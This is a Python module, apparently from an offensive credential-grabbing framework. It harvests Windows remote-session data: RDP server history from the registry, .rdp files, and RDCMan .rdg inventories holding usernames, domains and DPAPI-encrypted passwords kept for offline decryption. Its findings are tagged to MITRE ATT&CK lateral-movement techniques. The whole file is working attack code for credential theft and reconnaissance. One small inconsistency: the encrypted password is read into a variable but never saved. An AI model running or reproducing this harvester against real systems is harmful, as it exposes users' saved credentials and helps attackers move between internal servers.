"""
SessionGrabber — Extract RDP and remote session data

Targets:
- RDP connection history (HKCU registry: Terminal Server Client)
- RDP .rdp files with saved credentials
- WinRM trusted hosts and session history
- Terminal Services recent connections

MITRE ATT&CK: T1021.001 (Remote Desktop Protocol)
"""

from __future__ import annotations

import os
import re
import xml.etree.ElementTree as ET

from ._registry import enum_reg_subkeys, read_reg_value
from .base import GrabberContext, GrabberModule
from .models import ExtractedCredential, GrabberResult, GrabberStatus, PrivilegeLevel
from .utils import safe_read_text


class SessionGrabber(GrabberModule):
    name = "session"
    description = "Extract RDP history, .rdp files, RDCMan .rdg server inventories"
    min_privilege = PrivilegeLevel.USER
    supported_platforms = ("Windows", "Darwin", "Linux")
    default_enabled = True

    def preflight_check(self, context: GrabberContext) -> bool:
        # Always try — we'll find .rdp files or registry entries on Windows
        return True

    def execute(self, context: GrabberContext) -> GrabberResult:
        result = GrabberResult(module_name=self.name)

        # RDP connection history from registry
        if context.is_windows:
            rdp_history = self._extract_rdp_registry_history()
            result.credentials.extend(rdp_history)

        # .rdp files in common locations
        rdp_files = self._find_rdp_files(context)
        result.credentials.extend(rdp_files)

        # RDCMan .rdg files (server inventories with saved credentials)
        rdg_creds = self._find_rdg_files(context)
        result.credentials.extend(rdg_creds)
        if rdg_creds:
            result.findings.append(self.make_finding(
                file_path="RDCMan",
                description=f"RDCMan: {len(rdg_creds)} server(s) with saved credentials",
                score=150 * min(len(rdg_creds), 3),
                matched_value="RDCMan .rdg",
                snippets=[f"{c.url} ({c.username})" for c in rdg_creds[:5]],
            ))

        if result.credentials:
            result.findings.append(self.make_finding(
                file_path="RDP_SESSIONS",
                description=f"Found {len(result.credentials)} remote session record(s)",
                score=40 * min(len(result.credentials), 3),
                matched_value="RDP/Remote Sessions",
                snippets=[f"{c.url} ({c.username})" for c in result.credentials[:5]],
            ))

        result.status = GrabberStatus.COMPLETED
        return result

    @staticmethod
    def _extract_rdp_registry_history() -> list[ExtractedCredential]:
        """Extract RDP connection history from HKCU Terminal Server Client."""
        creds = []

        # Recent RDP servers
        servers = enum_reg_subkeys(
            "HKCU",
            r"Software\Microsoft\Terminal Server Client\Servers",
        )
        for server in servers:
            username = read_reg_value(
                "HKCU",
                rf"Software\Microsoft\Terminal Server Client\Servers\{server}",
                "UsernameHint",
            )
            creds.append(ExtractedCredential(
                source_module="session",
                credential_type="token",
                target_application="RDP History",
                url=server,
                username=str(username) if username else "",
                notes="From Terminal Server Client registry",
                mitre_technique="T1021.001",
            ))

        # Default connection settings
        default_server = read_reg_value(
            "HKCU",
            r"Software\Microsoft\Terminal Server Client\Default",
            "MRU0",
        )
        if default_server:
            creds.append(ExtractedCredential(
                source_module="session",
                credential_type="token",
                target_application="RDP History (Default)",
                url=str(default_server),
                notes="Most recent RDP connection",
                mitre_technique="T1021.001",
            ))

        return creds

    def _find_rdp_files(self, context: GrabberContext) -> list[ExtractedCredential]:
        """Find and parse .rdp files for saved connection details."""
        creds = []
        search_dirs = [
            os.path.join(context.user_profile_path, "Documents"),
            os.path.join(context.user_profile_path, "Desktop"),
            os.path.join(context.user_profile_path, "Downloads"),
        ]

        for search_dir in search_dirs:
            if not os.path.isdir(search_dir):
                continue

            try:
                for entry in os.scandir(search_dir):
                    if entry.is_file() and entry.name.lower().endswith(".rdp"):
                        cred = self._parse_rdp_file(entry.path)
                        if cred:
                            creds.append(cred)
            except (PermissionError, OSError):
                continue

        return creds

    @staticmethod
    def _parse_rdp_file(path: str) -> ExtractedCredential | None:
        """Parse a .rdp file for connection details."""
        content = safe_read_text(path)
        if not content:
            return None

        hostname = ""
        username = ""
        port = "3389"
        has_password = False

        for line in content.splitlines():
            line = line.strip()
            if line.startswith("full address:s:"):
                hostname = line.split(":", 2)[-1]
            elif line.startswith("username:s:"):
                username = line.split(":", 2)[-1]
            elif line.startswith("server port:i:"):
                port = line.split(":")[-1]
            elif line.startswith("password 51:b:"):
                has_password = True

        if hostname:
            return ExtractedCredential(
                source_module="session",
                credential_type="password" if has_password else "token",
                target_application="RDP File",
                url=f"{hostname}:{port}",
                username=username,
                notes=f"file={path}" + (" (has encrypted password)" if has_password else ""),
                mitre_technique="T1021.001",
            )
        return None

    def _find_rdg_files(self, context: GrabberContext) -> list[ExtractedCredential]:
        """Find and parse RDCMan .rdg files (server inventories with creds)."""
        creds = []
        search_dirs = [
            os.path.join(context.user_profile_path, "Documents"),
            os.path.join(context.user_profile_path, "Desktop"),
            os.path.join(context.user_profile_path, "Downloads"),
            os.path.join(context.appdata_local or "", "Microsoft", "Remote Desktop Connection Manager"),
        ]

        for search_dir in search_dirs:
            if not os.path.isdir(search_dir):
                continue
            try:
                for root, dirs, files in os.walk(search_dir):
                    for fname in files:
                        if fname.lower().endswith(".rdg"):
                            fpath = os.path.join(root, fname)
                            rdg_creds = self._parse_rdg_file(fpath)
                            creds.extend(rdg_creds)
                    if root.count(os.sep) - search_dir.count(os.sep) > 3:
                        dirs.clear()
            except (PermissionError, OSError):
                continue

        return creds

    def _parse_rdg_file(self, path: str) -> list[ExtractedCredential]:
        """Parse RDCMan .rdg XML for server connections with credentials.

        RDCMan files contain server groups with individual server entries.
        Each server can have a <logonCredentials> element with username,
        domain, and DPAPI-encrypted password.
        """
        creds = []
        content = safe_read_text(path)
        if not content:
            return creds

        try:
            root = ET.fromstring(content)
        except ET.ParseError:
            return creds

        # Search for server entries
        for server in root.iter("server"):
            display_name = ""
            hostname = ""
            username = ""
            domain = ""
            has_password = False

            name_elem = server.find("properties/name")
            if name_elem is not None and name_elem.text:
                hostname = name_elem.text.strip()

            display_elem = server.find("properties/displayName")
            if display_elem is not None and display_elem.text:
                display_name = display_elem.text.strip()

            # Check for logon credentials
            logon = server.find("logonCredentials")
            if logon is None:
                logon = server.find("properties/logonCredentials")

            if logon is not None:
                user_elem = logon.find("userName")
                domain_elem = logon.find("domain")
                pass_elem = logon.find("password")

                if user_elem is not None and user_elem.text:
                    username = user_elem.text.strip()
                if domain_elem is not None and domain_elem.text:
                    domain = domain_elem.text.strip()
                if pass_elem is not None and pass_elem.text:
                    has_password = True
                    # Password is DPAPI-encrypted, store for offline decrypt
                    encrypted_b64 = pass_elem.text.strip()

            if hostname:
                full_user = f"{domain}\\{username}" if domain and username else username
                creds.append(ExtractedCredential(
                    source_module="session",
                    credential_type="password" if has_password else "token",
                    target_application="RDCMan",
                    url=hostname,
                    username=full_user,
                    notes=f"rdg={os.path.basename(path)}" + (f"; display={display_name}" if display_name else "") + (" (has encrypted password)" if has_password else ""),
                    mitre_technique="T1021.001",
                    source_file=path,
                ))

        return creds
